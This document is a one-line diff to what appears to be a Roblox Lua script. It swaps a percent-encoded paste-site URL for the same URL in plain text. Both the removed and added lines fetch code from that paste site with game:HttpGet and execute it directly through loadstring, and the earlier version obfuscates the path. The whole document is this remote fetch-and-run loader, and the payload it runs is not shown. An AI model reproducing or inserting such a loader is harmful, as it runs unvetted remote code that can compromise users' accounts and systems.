@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://paste-drop.com/%72%61%77/%51%6A%64%70%66%52%34%4C%64%43",true))()
+loadstring(game:HttpGet("https://paste-drop.com/raw/QjdpfR4LdC",true))()
